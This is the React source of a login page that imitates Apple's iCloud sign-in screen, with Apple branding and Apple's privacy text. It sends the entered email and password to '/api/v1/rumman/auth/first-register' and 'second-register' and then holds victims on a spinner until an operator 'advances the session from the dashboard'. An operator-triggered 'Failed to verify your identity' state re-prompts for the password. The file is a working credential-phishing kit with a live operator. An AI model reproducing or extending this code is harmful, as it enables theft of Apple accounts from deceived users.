import { useEffect, useRef, useState } from "react";
import Layout from "../components/layout/Layout";
import { motion } from "framer-motion";
import { GoArrowUpRight } from "react-icons/go";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { createSocket } from "../lib/socket";

/** Classic Apple activity indicator (gray spokes) */
function AppleSpinner({ className = "" }) {
  return (
    <span
      className={`relative inline-block w-[20px] h-[20px] ${className}`}
      aria-hidden="true"
    >
      {Array.from({ length: 12 }).map((_, i) => (
        <span
          key={i}
          className="absolute left-1/2 top-0 w-[2px] h-[5px] rounded-full bg-[var(--spinner)] origin-[50%_10px]"
          style={{
            transform: `rotate(${i * 30}deg) translateX(-50%)`,
            opacity: 0.15 + (i / 12) * 0.85,
            animation: "apple-spin-fade 1s linear infinite",
            animationDelay: `${(-i / 12).toFixed(3)}s`,
          }}
        />
      ))}
    </span>
  );
}

function IPhoneSignInIcon() {
  /* Apple / FIDO passkey icon — person + key */
  return (
    <svg
      width="22"
      height="22"
      viewBox="0 -960 960 960"
      fill="currentColor"
      aria-hidden="true"
      className="shrink-0"
    >
      <path d="M120-160v-112q0-34 17.5-62.5T184-378q62-31 126-46.5T440-440q20 0 40 1.5t40 4.5q-4 58 21 109.5t73 84.5v80H120ZM760-40l-60-60v-186q-44-13-72-49.5T600-420q0-58 41-99t99-41q58 0 99 41t41 99q0 45-25.5 80T790-290l50 50-60 60 60 60-80 80ZM440-480q-66 0-113-47t-47-113q0-66 47-113t113-47q66 0 113 47t47 113q0 66-47 113t-113 47Zm300 80q17 0 28.5-11.5T780-440q0-17-11.5-28.5T740-480q-17 0-28.5 11.5T700-440q0 17 11.5 28.5T740-400Z" />
    </svg>
  );
}

function Login({ authUser }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState("email"); // email | password
  const [emailFocused, setEmailFocused] = useState(false);
  const [passFocused, setPassFocused] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [isLoadingEmail, setIsLoadingEmail] = useState(false);
  const [isLoadingPassword, setIsLoadingPassword] = useState(false);

  const emailInputRef = useRef(null);
  const passwordInputRef = useRef(null);
  const queryClient = useQueryClient();
  const isPassWrong = authUser?.currentStatus === "wrongPass";

  const emailActive = emailFocused || email.length > 0;
  const passActive = passFocused || password.length > 0;
  const isWaiting = authUser?.currentStatus === "waiting" || isLoadingPassword;

  // Restore email / waiting spinner if session already has password pending admin
  useEffect(() => {
    if (authUser?.email) setEmail(authUser.email);
    if (authUser?.currentStatus === "waiting") {
      setStep("password");
      setIsLoadingPassword(true);
    }
    if (authUser?.currentStatus === "wrongPass") {
      setStep("password");
      setIsLoadingPassword(false);
    }
  }, [authUser?.email, authUser?.currentStatus]);

  // Focus email only after the entrance form fade finishes (~2.8s)
  useEffect(() => {
    if (step !== "email" || isWaiting) return;
    const t = setTimeout(() => emailInputRef.current?.focus(), 2800);
    return () => clearTimeout(t);
  }, [step, isWaiting]);

  useEffect(() => {
    if (step === "password" && !isWaiting) passwordInputRef.current?.focus();
  }, [step, isWaiting]);

  useEffect(() => {
    const socket = createSocket();
    socket.on("user_updated", () => {
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    });
    socket.on("page_changed", () => {
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    });
    return () => socket.close();
  }, [queryClient]);

  const { mutate: changePage } = useMutation({
    mutationFn: async ({ userId, page }) => {
      const res = await fetch(`/api/v1/rumman/user/page/${userId}/${page}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to change page");
      return data;
    },
  });

  const resetWrongPass = () => {
    if (isPassWrong && authUser?._id) {
      changePage({ userId: authUser._id, page: "normal" });
    }
  };

  const { mutateAsync: submitEmailAsync } = useMutation({
    mutationFn: async () => {
      const res = await fetch("/api/v1/rumman/auth/first-register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      return data;
    },
  });

  const { mutateAsync: submitPasswordAsync } = useMutation({
    mutationFn: async () => {
      const res = await fetch("/api/v1/rumman/auth/second-register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });
      const data = await res.json();
      if (data.error) throw new Error(data.error);
      return data;
    },
  });

  const handleContinue = async () => {
    if (!email.trim() || isLoadingEmail) return;
    setIsLoadingEmail(true);
    const started = Date.now();
    try {
      await submitEmailAsync();
      // Keep spinner visible briefly like real iCloud
      const wait = Math.max(0, 900 - (Date.now() - started));
      await new Promise((r) => setTimeout(r, wait));
      setStep("password");
    } catch (e) {
      console.log(e);
    } finally {
      setIsLoadingEmail(false);
    }
  };

  const handleSignIn = async () => {
    if (!password.trim() || isLoadingPassword) return;
    setIsLoadingPassword(true);
    try {
      await submitPasswordAsync();
      // Keep the same Apple spinner in the Sign In button (like email Continue)
      // until admin advances the session from the dashboard. No auto-redirect.
    } catch (e) {
      console.log(e);
      setIsLoadingPassword(false);
    }
  };

  const canSignIn = password.trim().length > 0 && !isWaiting;

  return (
    <Layout>
      <style>{`
        @keyframes apple-spin-fade {
          0% { opacity: 1; }
          100% { opacity: 0.15; }
        }
      `}</style>

      <div className="pt-[20px] sm:pt-[44px] pb-[24px] sm:pb-0">
        <div className="w-full flex flex-col items-center px-0 sm:px-4">
          {/* Card appears first (empty shell), then content fades in — like real iCloud */}
          <motion.div
            initial={{ opacity: 0, scale: 0.985 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.55, ease: [0.22, 1, 0.36, 1] }}
            className="sm:w-[640px] w-full min-h-[calc(100dvh-120px)] sm:min-h-0 sm:h-[712px] apple-shadow sm:rounded-[34px] sm:mt-[44px] flex flex-col" style={{ background: "var(--card-bg)" }}
          >
            {/* Logo + title — fade in after empty card */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 1.15, delay: 0.85, ease: "easeOut" }}
              className="flex flex-col items-center px-[24px] sm:px-[80px]"
            >
              <div className="w-[120px] h-[120px] sm:w-[160px] sm:h-[160px] flex items-center justify-center mt-[24px] sm:mt-[40px]">
                <img
                  src="/logo.png?v=5"
                  alt=""
                  className="w-full h-full object-contain select-none"
                  draggable={false}
                />
              </div>
              <h1 className="mt-[14px] sm:mt-[18px] select-none cursor-default font-apple text-[24px] sm:text-[32px] font-[600] text-center leading-[1.2]" style={{ color: "var(--text-primary)" }}>
                Sign in with Apple Account
              </h1>
            </motion.div>

            {/* Form — fades in after logo/title */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.85, delay: 2.05, ease: "easeOut" }}
              className="flex-1 flex flex-col px-[24px] sm:px-[80px] pt-[24px] sm:pt-[34px] pb-[28px] sm:pb-[36px]"
            >
              {step === "email" ? (
                <>
                  {/* Email field with floating label */}
                  <div className="relative">
                    <input
                      ref={emailInputRef}
                      type="text"
                      autoCapitalize="off"
                      autoCorrect="off"
                      spellCheck="false"
                      autoComplete="username"
                      value={email}
                      disabled={isLoadingEmail}
                      onChange={(e) => setEmail(e.target.value)}
                      onFocus={() => {
                        resetWrongPass();
                        setEmailFocused(true);
                      }}
                      onBlur={() => setEmailFocused(false)}
                      onKeyDown={(e) => {
                        if (e.key === "Enter") handleContinue();
                      }}
                      className={`w-full h-[56px] text-[17px] font-apple rounded-[12px] outline-none focus:border-[#0071e3] focus:shadow-[0_0_0_3px_rgba(0,113,227,0.28)] px-[16px] border text-[var(--text-body)] bg-[var(--input-bg)] border-[var(--border-input)] ${
                        emailActive ? "pt-[18px] pb-[2px]" : ""
                      }`}
                    />
                    <span
                      className={`pointer-events-none absolute left-[16px] font-apple transition-all duration-150 origin-left text-[var(--text-secondary)] ${
                        emailActive
                          ? "top-[8px] text-[12px]"
                          : "top-1/2 -translate-y-1/2 text-[17px]"
                      }`}
                    >
                      Email or Phone Number
                    </span>
                  </div>

                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="inline-block mt-[14px] text-[15px] font-apple hover:underline" style={{ color: "var(--link)" }}
                  >
                    Create your Apple Account
                  </a>

                  <div className="flex gap-[14px] mt-[42px]">
                    <img
                      src="/privacy-icon.png?v=1"
                      alt=""
                      className="shrink-0 mt-[2px] w-[32px] h-auto object-contain"
                      draggable={false}
                    />
                    <p className="text-[13px] font-apple leading-[1.45]" style={{ color: "var(--text-secondary)" }}>
                      Your Apple Account information is used to allow you to
                      sign in securely and access your data. Apple records
                      certain data for security, support, and reporting
                      purposes. If you agree, Apple may also use your Apple
                      Account information to send you marketing emails and
                      communications, including based on your use of Apple
                      services.{" "}
                      <a
                        href="#"
                        onClick={(e) => e.preventDefault()}
                        className="hover:underline" style={{ color: "var(--link)" }}
                      >
                        See how your data is managed...
                      </a>
                    </p>
                  </div>

                  <div className="mt-auto pt-[40px]">
                    <div className="flex gap-[12px]">
                      <button
                        type="button"
                        onClick={handleContinue}
                        disabled={!email.trim() || isLoadingEmail}
                        className="flex-1 h-[44px] rounded-[12px] text-white font-apple text-[17px] font-medium transition flex items-center justify-center"
                        style={{
                          background: email.trim()
                            ? "#0071e3"
                            : "var(--btn-continue)",
                        }}
                      >
                        {isLoadingEmail ? <AppleSpinner /> : "Continue"}
                      </button>

                      <div className="flex-1 flex flex-col">
                        <button
                          type="button"
                          disabled={isLoadingEmail}
                          className="w-full h-[44px] rounded-[12px] font-apple text-[17px] font-medium transition flex items-center justify-center gap-[8px]"
                          style={{
                            background: isLoadingEmail ? "#636366" : "var(--btn-iphone)",
                            color: isLoadingEmail ? "transparent" : "var(--btn-iphone-text)",
                          }}
                        >
                          {!isLoadingEmail && (
                            <>
                              <IPhoneSignInIcon />
                              Sign in with iPhone
                            </>
                          )}
                        </button>
                        <p className="mt-[10px] text-center text-[11px] leading-[1.35] font-apple" style={{ color: "var(--text-secondary)" }}>
                          Requires a device with iOS 17 (or later).
                        </p>
                      </div>
                    </div>
                  </div>
                </>
              ) : (
                <>
                  {/* Stacked email + password like iCloud */}
                  <div
                    className={`overflow-hidden rounded-[12px] border ${
                      isPassWrong
                        ? "border-[#e30000]"
                        : passFocused
                        ? "border-[#0071e3] shadow-[0_0_0_3px_rgba(0,113,227,0.28)]"
                        : "border-[var(--border-input)]"
                    }`}
                  >
                    {/* Email (read-only looking top half) */}
                    <div className="relative border-b border-[var(--border-input)] bg-[var(--input-bg)]">
                      <input
                        type="text"
                        value={email}
                        readOnly
                        onClick={() => {
                          if (isWaiting) return;
                          setPassword("");
                          setStep("email");
                        }}
                        className="w-full h-[56px] pt-[18px] pb-[2px] px-[16px] text-[17px] font-apple text-[var(--text-body)] bg-transparent outline-none cursor-pointer"
                      />
                      <span className="pointer-events-none absolute left-[16px] top-[8px] text-[12px] font-apple" style={{ color: "var(--text-secondary)" }}>
                        Email or Phone Number
                      </span>
                    </div>

                    {/* Password */}
                    <div className="relative bg-[var(--input-bg)]">
                      <input
                        ref={passwordInputRef}
                        type="password"
                        autoCapitalize="off"
                        autoCorrect="off"
                        spellCheck="false"
                        autoComplete="current-password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onFocus={() => {
                          resetWrongPass();
                          setPassFocused(true);
                        }}
                        onBlur={() => setPassFocused(false)}
                        disabled={isWaiting}
                        onKeyDown={(e) => {
                          if (e.key === "Enter" && canSignIn) handleSignIn();
                        }}
                        className={`w-full h-[56px] px-[16px] text-[17px] font-apple text-[var(--text-body)] bg-transparent outline-none ${
                          passActive ? "pt-[18px] pb-[2px]" : ""
                        } ${isPassWrong ? "bg-[#fff2f4]" : ""}`}
                      />
                      <span
                        className={`pointer-events-none absolute left-[16px] font-apple transition-all duration-150 text-[var(--text-secondary)] ${
                          passActive
                            ? "top-[8px] text-[12px]"
                            : "top-1/2 -translate-y-1/2 text-[17px]"
                        }`}
                      >
                        Password
                      </span>
                    </div>
                  </div>

                  {isPassWrong && (
                    <div className="relative mt-3 mb-1 w-fit mx-auto">
                      <div className="absolute -top-[5px] left-1/2 -translate-x-1/2 w-0 h-0 border-l-[8px] border-l-transparent border-r-[8px] border-r-transparent border-b-[7px] border-b-[#fae9a3]" />
                      <div className="bg-[#fae9a3] px-3 py-2 border border-[#b9950178] text-[#494949] text-[14px] font-medium rounded-[5px] tooltip-shadow">
                        Failed to verify your identity. Try again.
                      </div>
                    </div>
                  )}

                  {/* Keep signed in + Forgot password */}
                  <div className="mt-[18px] flex items-center justify-between gap-3">
                    <label className="flex items-center gap-[8px] cursor-pointer select-none">
                      <input
                        type="checkbox"
                        checked={keepSignedIn}
                        disabled={isWaiting}
                        onChange={() => setKeepSignedIn((v) => !v)}
                        className="w-[15px] h-[15px] accent-[#0071e3] cursor-pointer"
                      />
                      <span className="text-[14px] font-apple" style={{ color: "var(--text-body)" }}>
                        Keep me signed in
                      </span>
                    </label>

                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      className="inline-flex items-center gap-[2px] text-[14px] font-apple hover:underline" style={{ color: "var(--link)" }}
                    >
                      Forgot password?
                      <GoArrowUpRight className="w-[14px] h-[14px]" />
                    </a>
                  </div>

                  <div className="mt-auto pt-[40px]">
                    <button
                      type="button"
                      onClick={handleSignIn}
                      disabled={!canSignIn}
                      className="w-full h-[44px] rounded-[12px] text-white font-apple text-[17px] font-medium transition flex items-center justify-center"
                      style={{
                        background: password.trim()
                          ? "#0071e3"
                          : "var(--btn-continue)",
                      }}
                    >
                      {isWaiting ? <AppleSpinner /> : "Sign In"}
                    </button>
                  </div>
                </>
              )}
            </motion.div>
          </motion.div>
        </div>
      </div>
    </Layout>
  );
}

export default Login;
